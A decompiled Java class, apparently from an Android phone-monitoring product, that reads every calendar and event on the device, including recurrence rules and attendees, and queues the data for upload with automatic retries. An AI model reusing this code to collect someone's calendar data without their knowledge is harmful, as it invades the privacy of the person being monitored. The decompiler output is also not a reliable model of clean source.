package com.vvt.capture.calendar;

import android.content.ContentResolver;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.datadeliverymanager.i;
import com.vvt.phoenix.prot.command.data.CalendarEntry;
import com.vvt.phoenix.prot.command.data.CalendarEntry.EntryType;
import com.vvt.phoenix.prot.command.data.CalendarEntry.Priority;
import com.vvt.phoenix.prot.command.data.CalendarEntry.Recurring;
import com.vvt.phoenix.prot.command.data.CalendarRecurrence;
import com.vvt.phoenix.prot.command.data.CalendarRecurrence.FirstDayOfWeek;
import com.vvt.phoenix.prot.command.data.CalendarRecurrence.RecurrenceType;
import com.vvt.phoenix.prot.command.data.e;
import com.vvt.phoenix.prot.command.data.f;
import com.vvt.phoenix.prot.command.w;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;

public class a
  implements com.vvt.capture.calendar.c.b, com.vvt.datadeliverymanager.a.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private ContentResolver c;
  private com.vvt.datadeliverymanager.b d;
  private com.vvt.capture.calendar.c.a e;
  private String f;
  private com.vvt.datadeliverymanager.a.a g;
  private Timer h;
  private RunningMode i;
  private boolean j = false;
  
  public a(RunningMode paramRunningMode, ContentResolver paramContentResolver, com.vvt.datadeliverymanager.b paramb, String paramString)
  {
    this.i = paramRunningMode;
    this.c = paramContentResolver;
    this.d = paramb;
    this.f = paramString;
  }
  
  private h a(List paramList, com.vvt.datadeliverymanager.a.a parama)
  {
    boolean bool1 = true;
    w localw = new com/vvt/phoenix/prot/command/w;
    localw.<init>();
    Iterator localIterator1 = paramList.iterator();
    for (;;)
    {
      boolean bool2 = localIterator1.hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.capture.calendar.b.c)localIterator1.next();
      com.vvt.phoenix.prot.command.data.d locald = new com/vvt/phoenix/prot/command/data/d;
      locald.<init>();
      int m = ((com.vvt.capture.calendar.b.c)localObject1).b();
      localObject2 = String.valueOf(m);
      locald.a((String)localObject2);
      localObject2 = ((com.vvt.capture.calendar.b.c)localObject1).a();
      locald.b((String)localObject2);
      localObject1 = ((com.vvt.capture.calendar.b.c)localObject1).f();
      Iterator localIterator2 = ((List)localObject1).iterator();
      for (;;)
      {
        bool2 = localIterator2.hasNext();
        if (!bool2) {
          break;
        }
        localObject1 = localIterator2.next();
        localObject2 = localObject1;
        localObject2 = (com.vvt.capture.calendar.b.b)localObject1;
        CalendarEntry localCalendarEntry = new com/vvt/phoenix/prot/command/data/CalendarEntry;
        localCalendarEntry.<init>();
        bool2 = ((com.vvt.capture.calendar.b.b)localObject2).n();
        Object localObject4;
        if (bool2)
        {
          localObject3 = ((com.vvt.capture.calendar.b.b)localObject2).m();
          localObject4 = new com/vvt/phoenix/prot/command/data/CalendarRecurrence;
          ((CalendarRecurrence)localObject4).<init>();
          int k = ((com.vvt.capture.calendar.b.d)localObject3).g();
          ((CalendarRecurrence)localObject4).c(k);
          k = ((com.vvt.capture.calendar.b.d)localObject3).h();
          ((CalendarRecurrence)localObject4).d(k);
          k = ((com.vvt.capture.calendar.b.d)localObject3).f();
          ((CalendarRecurrence)localObject4).b(k);
          localObject1 = CalendarRecurrence.FirstDayOfWeek.SUNDAY;
          int n = ((com.vvt.capture.calendar.b.d)localObject3).e();
          Object localObject5 = CalendarRecurrence.FirstDayOfWeek.SUNDAY;
          int i1 = ((CalendarRecurrence.FirstDayOfWeek)localObject5).getValue();
          if (n == i1)
          {
            localObject1 = CalendarRecurrence.FirstDayOfWeek.SUNDAY;
            ((CalendarRecurrence)localObject4).a((CalendarRecurrence.FirstDayOfWeek)localObject1);
            k = ((com.vvt.capture.calendar.b.d)localObject3).k();
            ((CalendarRecurrence)localObject4).g(k);
            k = ((com.vvt.capture.calendar.b.d)localObject3).d();
            ((CalendarRecurrence)localObject4).a(k);
            localObject1 = ((com.vvt.capture.calendar.b.d)localObject3).b();
            ((CalendarRecurrence)localObject4).b((String)localObject1);
            localObject1 = ((com.vvt.capture.calendar.b.d)localObject3).a();
            ((CalendarRecurrence)localObject4).a((String)localObject1);
            localObject1 = CalendarRecurrence.RecurrenceType.NONE;
            n = ((com.vvt.capture.calendar.b.d)localObject3).c();
            localObject5 = CalendarRecurrence.RecurrenceType.NONE;
            i1 = ((CalendarRecurrence.RecurrenceType)localObject5).getValue();
            if (n != i1) {
              break label648;
            }
            localObject1 = CalendarRecurrence.RecurrenceType.NONE;
          }
          for (;;)
          {
            ((CalendarRecurrence)localObject4).a((CalendarRecurrence.RecurrenceType)localObject1);
            k = ((com.vvt.capture.calendar.b.d)localObject3).i();
            ((CalendarRecurrence)localObject4).e(k);
            k = ((com.vvt.capture.calendar.b.d)localObject3).j();
            ((CalendarRecurrence)localObject4).f(k);
            localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).o();
            localObject3 = ((List)localObject1).iterator();
            for (;;)
            {
              bool3 = ((Iterator)localObject3).hasNext();
              if (!bool3) {
                break;
              }
              localObject1 = (String)((Iterator)localObject3).next();
              ((CalendarRecurrence)localObject4).c((String)localObject1);
            }
            n = ((com.vvt.capture.calendar.b.d)localObject3).e();
            localObject5 = CalendarRecurrence.FirstDayOfWeek.MONDAY;
            i1 = ((CalendarRecurrence.FirstDayOfWeek)localObject5).getValue();
            if (n == i1)
            {
              localObject1 = CalendarRecurrence.FirstDayOfWeek.MONDAY;
              break;
            }
            n = ((com.vvt.capture.calendar.b.d)localObject3).e();
            localObject5 = CalendarRecurrence.FirstDayOfWeek.TUESDAY;
            i1 = ((CalendarRecurrence.FirstDayOfWeek)localObject5).getValue();
            if (n == i1)
            {
              localObject1 = CalendarRecurrence.FirstDayOfWeek.TUESDAY;
              break;
            }
            n = ((com.vvt.capture.calendar.b.d)localObject3).e();
            localObject5 = CalendarRecurrence.FirstDayOfWeek.WEDNESDAY;
            i1 = ((CalendarRecurrence.FirstDayOfWeek)localObject5).getValue();
            if (n == i1)
            {
              localObject1 = CalendarRecurrence.FirstDayOfWeek.WEDNESDAY;
              break;
            }
            n = ((com.vvt.capture.calendar.b.d)localObject3).e();
            localObject5 = CalendarRecurrence.FirstDayOfWeek.THURSDAY;
            i1 = ((CalendarRecurrence.FirstDayOfWeek)localObject5).getValue();
            if (n == i1)
            {
              localObject1 = CalendarRecurrence.FirstDayOfWeek.THURSDAY;
              break;
            }
            n = ((com.vvt.capture.calendar.b.d)localObject3).e();
            localObject5 = CalendarRecurrence.FirstDayOfWeek.FRIDAY;
            i1 = ((CalendarRecurrence.FirstDayOfWeek)localObject5).getValue();
            if (n == i1)
            {
              localObject1 = CalendarRecurrence.FirstDayOfWeek.FRIDAY;
              break;
            }
            n = ((com.vvt.capture.calendar.b.d)localObject3).e();
            localObject5 = CalendarRecurrence.FirstDayOfWeek.SATURDAY;
            i1 = ((CalendarRecurrence.FirstDayOfWeek)localObject5).getValue();
            if (n != i1) {
              break;
            }
            localObject1 = CalendarRecurrence.FirstDayOfWeek.SATURDAY;
            break;
            label648:
            n = ((com.vvt.capture.calendar.b.d)localObject3).c();
            localObject5 = CalendarRecurrence.RecurrenceType.DAILY;
            i1 = ((CalendarRecurrence.RecurrenceType)localObject5).getValue();
            if (n == i1)
            {
              localObject1 = CalendarRecurrence.RecurrenceType.DAILY;
            }
            else
            {
              n = ((com.vvt.capture.calendar.b.d)localObject3).c();
              localObject5 = CalendarRecurrence.RecurrenceType.WEEKLY;
              i1 = ((CalendarRecurrence.RecurrenceType)localObject5).getValue();
              if (n == i1)
              {
                localObject1 = CalendarRecurrence.RecurrenceType.WEEKLY;
              }
              else
              {
                n = ((com.vvt.capture.calendar.b.d)localObject3).c();
                localObject5 = CalendarRecurrence.RecurrenceType.MONTHLY;
                i1 = ((CalendarRecurrence.RecurrenceType)localObject5).getValue();
                if (n == i1)
                {
                  localObject1 = CalendarRecurrence.RecurrenceType.MONTHLY;
                }
                else
                {
                  n = ((com.vvt.capture.calendar.b.d)localObject3).c();
                  localObject5 = CalendarRecurrence.RecurrenceType.YEARLY;
                  i1 = ((CalendarRecurrence.RecurrenceType)localObject5).getValue();
                  if (n == i1) {
                    localObject1 = CalendarRecurrence.RecurrenceType.YEARLY;
                  }
                }
              }
            }
          }
          localCalendarEntry.a((CalendarRecurrence)localObject4);
        }
        long l = ((com.vvt.capture.calendar.b.b)localObject2).a();
        localObject1 = String.valueOf(l);
        localCalendarEntry.a((String)localObject1);
        localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).c();
        localCalendarEntry.c((String)localObject1);
        localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).i();
        localCalendarEntry.i((String)localObject1);
        localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).f();
        localCalendarEntry.f((String)localObject1);
        localObject1 = CalendarEntry.EntryType.UNKNOWN;
        localCalendarEntry.a((CalendarEntry.EntryType)localObject1);
        localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).d();
        localCalendarEntry.d((String)localObject1);
        localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).h();
        localCalendarEntry.h((String)localObject1);
        localObject1 = new com/vvt/phoenix/prot/command/data/f;
        ((f)localObject1).<init>();
        Object localObject3 = ((com.vvt.capture.calendar.b.b)localObject2).k();
        ((f)localObject1).a((String)localObject3);
        localObject3 = ((com.vvt.capture.calendar.b.b)localObject2).j();
        ((f)localObject1).b((String)localObject3);
        localCalendarEntry.a((f)localObject1);
        localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).g();
        localCalendarEntry.g((String)localObject1);
        localObject1 = CalendarEntry.Priority.NONE;
        localCalendarEntry.a((CalendarEntry.Priority)localObject1);
        boolean bool3 = ((com.vvt.capture.calendar.b.b)localObject2).n();
        if (bool3)
        {
          localObject1 = CalendarEntry.Recurring.YES;
          localCalendarEntry.a((CalendarEntry.Recurring)localObject1);
        }
        for (;;)
        {
          localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).e();
          localCalendarEntry.e((String)localObject1);
          localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).b();
          localCalendarEntry.b((String)localObject1);
          bool3 = a;
          if (bool3) {}
          localObject1 = ((com.vvt.capture.calendar.b.b)localObject2).l();
          localObject2 = ((List)localObject1).iterator();
          for (;;)
          {
            bool3 = ((Iterator)localObject2).hasNext();
            if (!bool3) {
              break;
            }
            localObject1 = (com.vvt.capture.calendar.b.a)((Iterator)localObject2).next();
            localObject3 = new com/vvt/phoenix/prot/command/data/e;
            ((e)localObject3).<init>();
            localObject4 = ((com.vvt.capture.calendar.b.a)localObject1).b();
            ((e)localObject3).b((String)localObject4);
            localObject1 = ((com.vvt.capture.calendar.b.a)localObject1).a();
            ((e)localObject3).a((String)localObject1);
            localCalendarEntry.a((e)localObject3);
          }
          localObject1 = CalendarEntry.Recurring.NO;
          localCalendarEntry.a((CalendarEntry.Recurring)localObject1);
        }
        locald.a(localCalendarEntry);
      }
      localw.a(locald);
    }
    Object localObject1 = new com/vvt/datadeliverymanager/h;
    ((h)localObject1).<init>();
    ((h)localObject1).a(42);
    ((h)localObject1).a(localw);
    ((h)localObject1).a(this);
    Object localObject2 = DeliveryRequestType.REQUEST_TYPE_NEW;
    ((h)localObject1).a((DeliveryRequestType)localObject2);
    localObject2 = PriorityRequest.PRIORITY_NORMAL;
    ((h)localObject1).a((PriorityRequest)localObject2);
    localObject2 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
    ((h)localObject1).a((DataProviderType)localObject2);
    ((h)localObject1).c(15);
    ((h)localObject1).b(60000L);
    ((h)localObject1).c(bool1);
    ((h)localObject1).b(bool1);
    return (h)localObject1;
  }
  
  private void f()
  {
    c();
  }
  
  public void a()
  {
    boolean bool = this.j;
    if (!bool)
    {
      bool = true;
      this.j = bool;
      Object localObject1 = new com/vvt/capture/calendar/d/a;
      ((com.vvt.capture.calendar.d.a)localObject1).<init>();
      this.e = ((com.vvt.capture.calendar.c.a)localObject1);
      localObject1 = this.e;
      Object localObject2 = this.c;
      ((com.vvt.capture.calendar.c.a)localObject1).a((ContentResolver)localObject2);
      this.e.a(this);
      localObject1 = this.e;
      localObject2 = this.f;
      ((com.vvt.capture.calendar.c.a)localObject1).a((String)localObject2);
      localObject1 = this.e;
      ((com.vvt.capture.calendar.c.a)localObject1).a();
    }
  }
  
  public void a(com.vvt.datadeliverymanager.a.a parama)
  {
    this.g = parama;
  }
  
  public void a(i parami) {}
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.j;
    if (bool)
    {
      bool = false;
      this.j = false;
      Object localObject = this.e;
      if (localObject != null)
      {
        localObject = this.e;
        ((com.vvt.capture.calendar.c.a)localObject).b();
      }
      localObject = this.h;
      if (localObject != null)
      {
        localObject = this.h;
        ((Timer)localObject).cancel();
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(i parami)
  {
    Object localObject = this.g;
    if (localObject != null)
    {
      localObject = this.g;
      ((com.vvt.datadeliverymanager.a.a)localObject).b(parami);
    }
    boolean bool = parami.f();
    if (!bool)
    {
      localObject = this.h;
      if (localObject != null)
      {
        localObject = this.h;
        ((Timer)localObject).cancel();
      }
      localObject = new java/util/Timer;
      ((Timer)localObject).<init>();
      this.h = ((Timer)localObject);
      localObject = this.h;
      b localb = new com/vvt/capture/calendar/b;
      localb.<init>(this);
      long l = 60000L;
      ((Timer)localObject).schedule(localb, l);
    }
  }
  
  public void c()
  {
    Iterator localIterator = null;
    List localList1 = null;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = this.i;
    Object localObject4 = RunningMode.FULL;
    if (localObject1 == localObject4)
    {
      localObject1 = new com/vvt/capture/calendar/e/a;
      ((com.vvt.capture.calendar.e.a)localObject1).<init>();
    }
    for (localObject4 = localObject1;; localObject4 = localObject3)
    {
      bool1 = ((com.vvt.capture.calendar.e.b)localObject4).b();
      bool2 = a;
      if ((bool2) && (!bool1)) {
        break label234;
      }
      try
      {
        localObject5 = new com/vvt/capture/calendar/c;
        ((c)localObject5).<init>();
        localList1 = ((c)localObject5).a((com.vvt.capture.calendar.e.b)localObject4);
        localIterator = localList1.iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = localIterator.next();
          localObject1 = (com.vvt.capture.calendar.b.c)localObject1;
          boolean bool3 = a;
          if (bool3) {}
          List localList2 = ((c)localObject5).a((com.vvt.capture.calendar.b.c)localObject1, (com.vvt.capture.calendar.e.b)localObject4);
          ((com.vvt.capture.calendar.b.c)localObject1).a(localList2);
        }
        localObject3 = new com/vvt/capture/calendar/e/c;
      }
      finally
      {
        ((com.vvt.capture.calendar.e.b)localObject4).c();
      }
      localObject4 = this.c;
      ((com.vvt.capture.calendar.e.c)localObject3).<init>((ContentResolver)localObject4);
    }
    Object localObject3 = a(localList1, this);
    boolean bool2 = a;
    if (bool2) {}
    Object localObject5 = this.d;
    ((com.vvt.datadeliverymanager.b)localObject5).a((h)localObject3);
    ((com.vvt.capture.calendar.e.b)localObject4).c();
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label234:
      localObject3 = this.g;
      if (localObject3 != null)
      {
        bool1 = a;
        if (bool1) {}
        localObject3 = new com/vvt/datadeliverymanager/i;
        ((i)localObject3).<init>();
        ((i)localObject3).a(null);
        ((i)localObject3).a(null);
        ((i)localObject3).a(null);
        ((i)localObject3).a(312);
        ((i)localObject3).a("Can not open the calendar database");
        ((i)localObject3).b(false);
        ((i)localObject3).a(false);
        int k = 42;
        ((i)localObject3).b(k);
        localObject4 = this.g;
        ((com.vvt.datadeliverymanager.a.a)localObject4).b((i)localObject3);
      }
    }
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    c();
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calendar/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */